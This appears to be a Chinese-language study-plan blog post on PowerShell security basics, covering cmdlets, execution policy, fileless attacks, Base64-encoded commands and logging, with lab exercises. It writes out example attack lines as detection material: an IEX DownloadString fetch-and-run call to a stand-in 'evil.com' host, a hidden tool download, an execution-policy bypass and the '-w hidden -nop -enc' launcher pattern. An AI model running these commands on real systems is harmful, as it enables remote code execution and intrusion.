---
title: Day017：操作系统与脚本 - PowerShell 安全基础
tags:
  - 网络
  - 安全
  - 学习计划
categories:
  - 网络安全
abbrlink: bff18
date: 2026-02-08
updated: 2026-02-08
---

# Day017：操作系统与脚本 - PowerShell 安全基础

- **日期**：2026-02-08
- **周次**：第 3 周
- **模块**：操作系统与脚本
- **主题**：PowerShell 安全基础
- **预计学习时间**：3 小时

---

## 🎯 学习目标

学完今天你应该能做到：

- **打破限制**：理解执行策略 (Execution Policy) 为什么拦不住黑客，但能拦住你。
- **火眼金睛**：一眼识别出恶意 PowerShell 脚本的特征（混淆、Base64）。
- **实战操作**：用 PowerShell 查进程、算哈希、下载文件（黑客常用招数）。

<!--more-->

## 📚 完整学习内容（必读）

### 一、概念理解：CMD 的超级进化版

如果说 CMD 是瑞士军刀，那 PowerShell 就是**钢铁侠的战甲**。
它不仅能执行命令，还能调用 .NET 框架，直接操作内存和系统底层。

#### 1. 动词-名词 (Verb-Noun) 结构
PowerShell 的命令非常好记，都是“动作-对象”的格式：
- 想获取服务？`Get-Service`
- 想停止进程？`Stop-Process`
- 想新建文件？`New-Item`

#### 2. 管道 (|) 的力量
和 Linux 一样，PowerShell 也有管道，把上一个命令的结果传给下一个。
`Get-Process | Sort-Object CPU` （获取进程 -> 按 CPU 排序）

### 二、原理讲解：黑客的最爱

#### 1. 执行策略 (Execution Policy)
你在运行 `.ps1` 脚本时，可能会报错说“禁止运行脚本”。
这是微软为了防止你误点病毒设置的**安全特性**，**不是安全边界**。
黑客有一万种方法绕过它：
`powershell -ExecutionPolicy Bypass -File evil.ps1`

#### 2. 无文件攻击 (Fileless Attack)
黑客不需要把病毒文件下载到硬盘上（会被杀毒软件扫描）。
他们可以直接让 PowerShell 从网上下载代码并在**内存**中执行：
`IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
*看到这种代码，直接报警！*

### 三、技术细节：实战命令速查

打开 **PowerShell (管理员)**：

#### 1. 基础信息搜集
```powershell
Get-ComputerInfo  # 查看电脑详细信息
Get-LocalUser     # 查看本地用户
Get-NetTCPConnection | Where-Object State -eq Established  # 查看已建立的网络连接
```

#### 2. 文件校验 (计算哈希)
下载软件后怕被篡改？算一下指纹：
```powershell
Get-FileHash C:\Windows\System32\notepad.exe -Algorithm MD5
```

#### 3. 危险操作（黑客常用）
- **Base64 编码命令**：如果你在日志里看到 `-Enc` 后面跟一堆乱码，那就是在隐藏命令。
- **隐蔽下载**：`Invoke-WebRequest -Uri "http://hack.com/tool.exe" -OutFile "C:\Temp\tool.exe"`

### 四、进阶知识：PowerShell 日志审计

为了抓住黑客，我们需要开启 PowerShell 的**脚本块日志记录 (Script Block Logging)**。
开启后，哪怕黑客用了混淆代码，系统也会记录下解密后的真实意图。

### 五、本日知识点速查表

| 序号 | 核心概念 | 关键点 | 备注 |
|------|----------|--------|------|
| 1 | **Alias** | 别名 | `ls` 其实是 `Get-ChildItem` 的别名 |
| 2 | **Bypass** | 绕过策略 | `-Exec Bypass` 是黑客标配 |
| 3 | **IEX** | Invoke-Expression | 立即执行字符串中的代码（极度危险） |
| 4 | **-Enc** | EncodedCommand | 运行 Base64 编码的命令 |
| 5 | **Pipe** | 管道符 `|` | 传递对象而不是文本 |

---

## 🔧 实践任务（合法授权范围内）

### 任务 1：绕过自己（体验执行策略）

**操作步骤**：
1. 新建一个文本文件 `hello.ps1`，内容写 `Write-Host "Hello Hacker"`。
2. 双击它。你会发现它**闪退**或者用记事本打开了，根本不运行。
3. 打开 PowerShell，cd 到该目录，运行 `.\hello.ps1`。
4. 如果报错红色字体，说明被拦截了。
5. 运行 `Set-ExecutionPolicy RemoteSigned`，选 Y。
6. 再次运行 `.\hello.ps1`。成功了吗？

### 任务 2：解码“天书”（解密 Base64）

黑客经常把命令加密成 Base64。我们来模拟一下。

**操作步骤**：
1. 输入命令加密：
   `$Text = "echo 'I am hacked'" `
   `$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)`
   `$Encoded = [Convert]::ToBase64String($Bytes)`
   `echo $Encoded`
2. 你会得到一串乱码（如 `ZWNobyAnSSBhbSBoYWNrZWQn...`）。
3. 假设你在日志里发现了这串乱码，怎么解密？
   `$Bytes = [System.Convert]::FromBase64String("你的乱码")`
   `[System.Text.Encoding]::Unicode.GetString($Bytes)`

### 任务 3：进程猎手

**操作步骤**：
1. 找出占用 CPU 最多的前 5 个进程。
   命令：`Get-Process | Sort-Object CPU -Descending | Select-Object -First 5`
2. 观察有没有名字奇怪的进程？

---

## 📝 巩固练习

### 练习 1：概念理解
**问**：看到命令 `powershell -w hidden -nop -enc ...` 是什么意思？
**答**：这是恶意脚本的标准起手式。
- `-w hidden`: 隐藏窗口（后台运行）。
- `-nop`: NoProfile，不加载用户配置文件（为了快且稳）。
- `-enc`: 后面跟的是 Base64 加密的恶意代码。

### 练习 2：实操复盘
**问**：如何用 PowerShell 检查某个端口（比如 80）是否开放？
**答**：`Test-NetConnection -ComputerName baidu.com -Port 80`。如果 `TcpTestSucceeded` 为 True，说明通了。

---

## ✅ 学习成果自检

- [ ] 我知道怎么允许运行 ps1 脚本。
- [ ] 我能看懂 `Get-Service | Where-Object Status -eq Running` 的含义。
- [ ] 我知道 `IEX` 和 `-Enc` 是高危特征。

---

> 💬 **老师寄语**：
> PowerShell 是把双刃剑。黑客用它攻城略地，管理员用它自动化运维。掌握它，你就掌握了 Windows 的“控制台”。明天，我们换个口味，去看看 Linux 世界的 **Bash**。
